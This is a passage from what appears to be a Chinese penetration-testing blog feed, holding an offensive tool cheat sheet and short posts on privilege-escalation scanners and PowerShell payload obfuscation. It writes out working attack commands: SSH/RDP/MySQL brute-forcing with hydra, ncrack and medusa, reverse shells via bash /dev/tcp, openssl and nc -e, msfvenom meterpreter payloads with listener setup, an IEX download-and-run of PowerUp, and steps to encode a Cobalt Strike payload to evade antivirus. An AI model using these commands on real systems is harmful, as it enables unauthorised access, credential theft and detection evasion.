result_mas.txt --rate=<span class="hljs-number">10000</span><br></code></pre></td></tr></table></figure><h3 id="邮箱搜集工具"><a href="#邮箱搜集工具" class="headerlink" title="邮箱搜集工具"></a>邮箱搜集工具</h3><p>EmailSniper</p><h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>SubDominscanner<br>OneForAll<br><a href="https://www.dnsgrep.cn/">https://www.dnsgrep.cn</a><br><a href="https://securitytrails.com/">https://securitytrails.com</a></p><p>可参考<br><a href="http://uuzdaisuki.com/2021/05/31/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2021/05/31/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/</a></p><h3 id="指纹收集"><a href="#指纹收集" class="headerlink" title="指纹收集"></a>指纹收集</h3><p>whatweb -v <a href="http://baidu.com/">http://baidu.com</a></p><p>云悉</p><h3 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h3><p>御剑</p><p>Dirbuster</p><p><a href="https://www.jianshu.com/p/79c7b1eda56e">https://www.jianshu.com/p/79c7b1eda56e</a></p><p>webpathbrute</p><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>goby</p><p>awvs</p><p>burpsuite</p><p>nessus</p><p>xray</p><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>常见设备口令速查 <a href="http://uuzdaisuki.com/2020/11/09/%E5%B8%B8%E8%A7%81web%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2020/11/09/%E5%B8%B8%E8%A7%81web%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%80%BB%E7%BB%93/</a></p><p>常见未授权访问利用总结 <a href="http://uuzdaisuki.com/2021/01/10/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2021/01/10/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></p><p>hydra</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hydra</span> -V -l fakeroot -P top<span class="hljs-number">100</span>.txt <span class="hljs-number">172.18.2.177</span> ssh<br><span class="hljs-attribute">hydra</span> -V -l admin -P top<span class="hljs-number">100</span>.txt <span class="hljs-number">172.18.2.177</span> rdp<br><span class="hljs-attribute">hydra</span> -V -l root -P top<span class="hljs-number">100</span>.txt <span class="hljs-number">172.18.2.177</span> mysql<br></code></pre></td></tr></table></figure><p>ncrack</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ncrack</span> -vv -d<span class="hljs-number">10</span> -user root -P top<span class="hljs-number">100</span>.txt <span class="hljs-number">172.18.2.177</span> -p ssh -g CL=<span class="hljs-number">10</span>,at=<span class="hljs-number">3</span><br><span class="hljs-attribute">ncrack</span> -vv -d<span class="hljs-number">10</span> -user root -P top<span class="hljs-number">100</span>.txt <span class="hljs-number">172.18.2.177</span> -p mysql -g CL=<span class="hljs-number">10</span>,at=<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>medusa</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">medusa</span> -v <span class="hljs-number">6</span> -h <span class="hljs-number">172.18.2.177</span> -u fakeroot -P top<span class="hljs-number">100</span>.txt -M ssh -t <span class="hljs-number">10</span> -O out.txt<br><span class="hljs-attribute">medusa</span> -v <span class="hljs-number">6</span> -h <span class="hljs-number">172.18.2.177</span> -u root -P top<span class="hljs-number">100</span>.txt -M mysql -t <span class="hljs-number">10</span> -O out.txt<br></code></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>metasploit</p><p>burpsuite</p><p>sqlmap</p><p>xxer （xml注入利用工具） <a href="https://github.com/TheTwitchy/xxer">https://github.com/TheTwitchy/xxer</a> </p><p>ysoserial （反序列化利用工具） <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>Struts2-Scan （struts2历史漏洞扫描和利用） <a href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a></p><p>weblogicScanner （weblogic历史漏洞扫描利用） <a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p><p>exphub （常见web框架cve利用） <a href="https://github.com/zhzyker/exphub">https://github.com/zhzyker/exphub</a></p><p>cve，cms，中间件，OA系统漏洞exp合集<br><a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection</a></p><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>免杀webshell三篇总结请见：<br><a href="http://uuzdaisuki.com/2021/05/15/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6asp%E7%AF%87/">http://uuzdaisuki.com/2021/05/15/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6asp%E7%AF%87/</a><br><a href="http://uuzdaisuki.com/2021/05/15/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6jsp%E7%AF%87/">http://uuzdaisuki.com/2021/05/15/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6jsp%E7%AF%87/</a><br><a href="http://uuzdaisuki.com/2021/05/15/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6php%E7%AF%87/">http://uuzdaisuki.com/2021/05/15/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6php%E7%AF%87/</a></p><p>由命令执行快速寻找webshell路径并写入请见：<br><a href="http://uuzdaisuki.com/2021/05/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%86%99webshell%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2021/05/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%86%99webshell%E6%80%BB%E7%BB%93/</a></p><p>菜刀</p><p>蚁剑</p><p>冰蝎</p><p>哥斯拉</p><p>普通反弹shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/HOST/</span>PORT <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>加密shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">openssl req -x509 -newkey rsa:<span class="hljs-number">4096</span> -keyout key.pem -out cert.pem -days <span class="hljs-number">365</span> -nodes<br>openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="hljs-number">4444</span><br>mkfifo <span class="hljs-regexp">/tmp/</span>s; <span class="hljs-regexp">/bin/</span>sh -i &lt; <span class="hljs-regexp">/tmp/</span>s <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | openssl s_client -quiet -connect <span class="hljs-number">192.168</span>.xx.xx:<span class="hljs-number">4444</span> &gt; <span class="hljs-regexp">/tmp/</span>s; rm <span class="hljs-regexp">/tmp/</span>s<br></code></pre></td></tr></table></figure><p>nc</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">攻击机 nc -lvp <span class="hljs-number">4444</span><br>靶机 nc -e /bin/bash xx<span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span> <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>sudo提权<br><a href="http://uuzdaisuki.com/2020/02/12/linux%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2020/02/12/linux%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a></p><p>本地内核提权速查流程<br><a href="http://uuzdaisuki.com/2021/04/12/windows%E6%8F%90%E6%9D%83%E9%80%9F%E6%9F%A5%E6%B5%81%E7%A8%8B/">http://uuzdaisuki.com/2021/04/12/windows%E6%8F%90%E6%9D%83%E9%80%9F%E6%9F%A5%E6%B5%81%E7%A8%8B/</a></p><p>提权扫描工具一览<br><a href="http://uuzdaisuki.com/2021/06/09/%E6%8F%90%E6%9D%83%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%B8%80%E8%A7%88/">http://uuzdaisuki.com/2021/06/09/%E6%8F%90%E6%9D%83%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%B8%80%E8%A7%88/</a></p><p>各类exp<br>典型通杀:脏牛CVE-2016-5195</p><p>metasploit</p><p>cobalt strike</p><p>本地漏洞扫描工具：</p><p>windows/linux exploit suggester</p><p>powerup</p><p>accesschk</p><p>Sherlock</p><h3 id="本地口令获取和破解"><a href="#本地口令获取和破解" class="headerlink" title="本地口令获取和破解"></a>本地口令获取和破解</h3><p>哈希提取总结：<br><a href="http://uuzdaisuki.com/2021/04/22/windows%E5%93%88%E5%B8%8C%E6%8F%90%E5%8F%96%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2021/04/22/windows%E5%93%88%E5%B8%8C%E6%8F%90%E5%8F%96%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a></p><p>hash-identifier 判断哈希类型</p><p>getpass</p><p>pwdump8</p><p>Quarks-pwdump</p><p>mimikatz</p><p>Mimipenguin</p><p>Get-PassHashes.ps1</p><p>LaZagne<br><a href="http://uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/">http://uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/</a></p><p>hashcat+口令字典<br><a href="http://uuzdaisuki.com/2020/07/28/%E5%93%88%E5%B8%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7hashcat/">http://uuzdaisuki.com/2020/07/28/%E5%93%88%E5%B8%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7hashcat/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">--<span class="hljs-built_in">hash</span>-<span class="hljs-built_in">type</span> <span class="hljs-number">0</span> --attack-mode <span class="hljs-number">0</span><br>-m选择哈希类型<br><span class="hljs-number">1000</span>为windows nt <span class="hljs-built_in">hash</span><br>-a选择模式<br><span class="hljs-number">0</span> Straight（字典破解）<br><span class="hljs-number">1</span> Combination（组合破解）<br><span class="hljs-number">3</span> Brute-force（掩码暴力破解）<br><span class="hljs-number">6</span> Hybrid <span class="hljs-built_in">dict</span> + mask（混合字典+掩码）<br><span class="hljs-number">7</span> Hybrid mask + <span class="hljs-built_in">dict</span>（混合掩码+字典）<br></code></pre></td></tr></table></figure><h3 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h3><p>linuxprivchecker</p><p>LinEnum</p><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>常见后门手法</p><p>metasploit</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p linux<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp LHOST=<span class="hljs-number">170.170</span>.<span class="hljs-number">64.17</span> LPORT=<span class="hljs-number">4444</span> -f elf -o reverse_tcp_linux64<br>msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=<span class="hljs-number">4444</span> -f exe -o reverse_tcp.exe<br>msfconsole<br>use exploit<span class="hljs-regexp">/multi/</span>handler<br>set PAYLOAD windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp<br>set LHOST xxx.xxx.xxx.xxx<br>set LPORT <span class="hljs-number">4444</span><br>run<br><br>常用后续命令<br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/backlion/</span>p/<span class="hljs-number">9484949</span>.html<br></code></pre></td></tr></table></figure><p>普通shell升级meterpreter<br><a href="http://uuzdaisuki.com/2021/03/12/msf%E6%99%AE%E9%80%9Ashell%E5%8D%87%E7%BA%A7%E6%88%90meterpreter/">http://uuzdaisuki.com/2021/03/12/msf%E6%99%AE%E9%80%9Ashell%E5%8D%87%E7%BA%A7%E6%88%90meterpreter/</a></p><p>cs与msf互相转换<br><a href="http://uuzdaisuki.com/2021/05/21/msf%E4%B8%8Ecs%E4%BA%92%E7%9B%B8%E8%BD%AC%E6%8D%A2/">http://uuzdaisuki.com/2021/05/21/msf%E4%B8%8Ecs%E4%BA%92%E7%9B%B8%E8%BD%AC%E6%8D%A2/</a></p><p>python直连反弹shell<br><a href="http://uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/">http://uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/</a><br>其他语言直连反弹shell  </p><p>linux后门手法总结<br><a href="http://uuzdaisuki.com/2021/01/05/linux%E5%90%8E%E9%97%A8%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2021/01/05/linux%E5%90%8E%E9%97%A8%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/</a></p><p>windows常见后门手法（这篇几年前写的，后续有时间会出一篇新的较全面的奇淫技巧）<br><a href="http://uuzdaisuki.com/2018/06/18/windows%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%8F%8A%E9%98%B2%E8%8C%83/">http://uuzdaisuki.com/2018/06/18/windows%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%8F%8A%E9%98%B2%E8%8C%83/</a></p><h3 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><p>痕迹清理<br><a href="http://uuzdaisuki.com/2020/11/11/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2020/11/11/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a></p><h3 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h3><p>Hydra</p><p>nessus</p><p>metasploit</p><p>nmap</p><p>powersploit</p><p>Empire</p><p>Psnmap</p><p>lcx</p><p>ew</p><p>tunna</p><p>proxychains</p><p>FRP</p><p>N2N</p><p>票据传递：<br><a href="http://uuzdaisuki.com/2021/04/21/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">http://uuzdaisuki.com/2021/04/21/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</a></p><p>内网信息收集：<br><a href="http://uuzdaisuki.com/2021/05/19/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2021/05/19/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/</a></p><h3 id="内网命令执行和文件访问"><a href="#内网命令执行和文件访问" class="headerlink" title="内网命令执行和文件访问"></a>内网命令执行和文件访问</h3><p>at</p><p>schtasks</p><p>telnet</p><p>sc</p><p>wmic</p><p>wmiexec.vbs</p><p>python impacket wmiexec.py</p><p>psexec</p><p>远程桌面</p><p>域渗透ipc命令执行总结<br><a href="http://uuzdaisuki.com/2021/04/29/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8ipc%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2021/04/29/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8ipc%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</a></p><p>数据回传方式总结：<br><a href="http://uuzdaisuki.com/2021/01/04/%E6%95%B0%E6%8D%AE%E5%9B%9E%E4%BC%A0%E9%80%9A%E9%81%93%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2021/01/04/%E6%95%B0%E6%8D%AE%E5%9B%9E%E4%BC%A0%E9%80%9A%E9%81%93%E6%80%BB%E7%BB%93/</a></p><h3 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h3><p>Cain</p><p>Arpspoof</p><p>ettercap</p><h3 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h3><p>pupy类远控</p><p>teamview</p><p>pcanywhere</p><p>radmin</p><p>手机端</p><p>DroidJack</p><p>Dendroid</p><p>SpyNote</p><p>远控免杀工具总结<br><a href="http://uuzdaisuki.com/2021/05/25/%E5%87%A0%E6%AC%BE%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2021/05/25/%E5%87%A0%E6%AC%BE%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</a></p><h3 id="典型windows-rce"><a href="#典型windows-rce" class="headerlink" title="典型windows-rce"></a>典型windows-rce</h3><p>ms17-010 基本通杀</p><p>cve-2019-0708 开放3389情况 windows7及之前通杀</p><h3 id="实用工具"><a href="#实用工具" class="headerlink" title="实用工具"></a>实用工具</h3><p>q-dir 文件管理工具，可开四个窗口</p><p>beyond compare 文件/文本比较工具</p><p>cmder 命令行工具</p><p>everything 文件搜索工具 </p><p>navicat 数据库连接工具，支持超多种类数据库，支持导出数据，甚至提供拖库的tunnel.php等</p><p>悬剑3.0 超齐全windows工具库系统</p><p>小米范系列工具 可视化，操作简便 <a href="https://www.cnblogs.com/SEC-fsq/tag/%E6%88%91%E7%9A%84%E5%B0%8F%E5%B7%A5%E5%85%B7/">https://www.cnblogs.com/SEC-fsq/tag/%E6%88%91%E7%9A%84%E5%B0%8F%E5%B7%A5%E5%85%B7/</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>提权扫描工具一览</title>
    <link href="/2021/06/09/%E6%8F%90%E6%9D%83%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%B8%80%E8%A7%88/"/>
    <url>/2021/06/09/%E6%8F%90%E6%9D%83%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%B8%80%E8%A7%88/</url>
    
    <content type="html"><![CDATA[<h2 id="使用Windows-Exploit-Suggester解析systeminfo"><a href="#使用Windows-Exploit-Suggester解析systeminfo" class="headerlink" title="使用Windows-Exploit-Suggester解析systeminfo"></a>使用Windows-Exploit-Suggester解析systeminfo</h2><p><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./windows-exploit-suggester.py</span><br></code></pre></td></tr></table></figure><h2 id="使用Linux-Exploit-Suggester-sh寻找linux提权问题"><a href="#使用Linux-Exploit-Suggester-sh寻找linux提权问题" class="headerlink" title="使用Linux-Exploit-Suggester.sh寻找linux提权问题"></a>使用Linux-Exploit-Suggester.sh寻找linux提权问题</h2><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./linux-exploit-suggester.sh</span><br></code></pre></td></tr></table></figure><h2 id="使用Sherlock"><a href="#使用Sherlock" class="headerlink" title="使用Sherlock"></a>使用Sherlock</h2><p><a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-variable">Sherlock</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Find</span><span class="hljs-operator">-</span><span class="hljs-variable">AllVulns</span><br></code></pre></td></tr></table></figure><h2 id="使用msf查询补丁和可利用提权漏洞"><a href="#使用msf查询补丁和可利用提权漏洞" class="headerlink" title="使用msf查询补丁和可利用提权漏洞"></a>使用msf查询补丁和可利用提权漏洞</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 查询补丁</span><br>meterpreter&gt; <span class="hljs-builtin-name">run</span> post/windows/gather/enum_patches <br>[+] KB2999226 installed on 11/25/2020<br>[+] KB976902 installed on 11/21/2010<br><br><span class="hljs-comment"># 查询Exp</span><br>msf&gt; use post/multi/recon/local_exploit_suggester <br>msf&gt; <span class="hljs-builtin-name">set</span> LHOST &lt;攻击机IP&gt;<br>msf&gt; <span class="hljs-builtin-name">set</span> SESSION &lt;session_id&gt;<br>msf&gt; run<br><br><span class="hljs-comment"># 利用示例</span><br>msf&gt; use exploit/windows/local/cve_2019_1458_wizardopium <br>msf&gt; <span class="hljs-builtin-name">set</span> SESSION &lt;session_id&gt;<br>msf&gt; run<br>meterpreter&gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br></code></pre></td></tr></table></figure><h2 id="使用powerup检查提权漏洞"><a href="#使用powerup检查提权漏洞" class="headerlink" title="使用powerup检查提权漏洞"></a>使用powerup检查提权漏洞</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">powershell.exe -exec <span class="hljs-keyword">bypass </span>-Command <span class="hljs-string">&quot;&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br>powershell.exe -<span class="hljs-keyword">nop </span>-exec <span class="hljs-keyword">bypass </span>-c <span class="hljs-string">&quot;IEX (New-object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#x27;);Invoke-AllChecks&quot;</span><br></code></pre></td></tr></table></figure><h2 id="使用accesschk-exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改"><a href="#使用accesschk-exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改" class="headerlink" title="使用accesschk.exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改"></a>使用accesschk.exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stata">accesschk <span class="hljs-string">&quot;d:\dir&quot;</span><br>查看所有用户在<span class="hljs-keyword">d</span>盘<span class="hljs-keyword">dir</span>路径的子路径的权限<br><br>accesschk <span class="hljs-string">&quot;Administrator &quot;</span><span class="hljs-keyword">d</span>:\<span class="hljs-keyword">dir</span>&quot;<br>查看Administrator用户在<span class="hljs-keyword">d</span>盘<span class="hljs-keyword">dir</span>路径的子路径的权限<br><br>accesschk Administrators -c *<br>查看Administrators组对所有服务的权限<br><br>accesschk -k Guest hklm\software<br>查看Guest用户对hklm\software注册表的权限<br><br>accesschk -<span class="hljs-keyword">ou</span> User<br>查看User用户对全局对象的权限<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>提权</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用Invoke-Obfuscation对恶意powershell编码隐藏特征</title>
    <link href="/2021/06/09/%E4%BD%BF%E7%94%A8Invoke-Obfuscation%E5%AF%B9%E6%81%B6%E6%84%8Fpowershell%E7%BC%96%E7%A0%81%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81/"/>
    <url>/2021/06/09/%E4%BD%BF%E7%94%A8Invoke-Obfuscation%E5%AF%B9%E6%81%B6%E6%84%8Fpowershell%E7%BC%96%E7%A0%81%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81/</url>
    
    <content type="html"><![CDATA[<h2 id="使用cs生成powershell-payload"><a href="#使用cs生成powershell-payload" class="headerlink" title="使用cs生成powershell payload"></a>使用cs生成powershell payload</h2><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/obfuscation/ps01.png"></p><h2 id="使用Invoke-Obfuscation对其aes加密"><a href="#使用Invoke-Obfuscation对其aes加密" class="headerlink" title="使用Invoke-Obfuscation对其aes加密"></a>使用Invoke-Obfuscation对其aes加密</h2><p>下载</p><p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/obfuscation/ps02.png"></p><p>加密payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">Import-Module .\Invoke-Obfuscation.ps1<br>Invoke-Obfuscation<br>set scriptpath .\payload.ps1<br>encoding<br>选择encoding方式（数字）<br>out payload2.ps1<br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>使用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Import</span>-Module .\payload<span class="hljs-number">2</span>.ps<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/obfuscation/ps03.png"></p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AlwaysInstallElevated提权</title>
    <link href="/2021/06/09/AlwaysInstallElevated%E6%8F%90%E6%9D%83/"/>
    <url>/2021/06/09/AlwaysInstallElevated%E6%8F%90%E6%9D%83/</url>
    
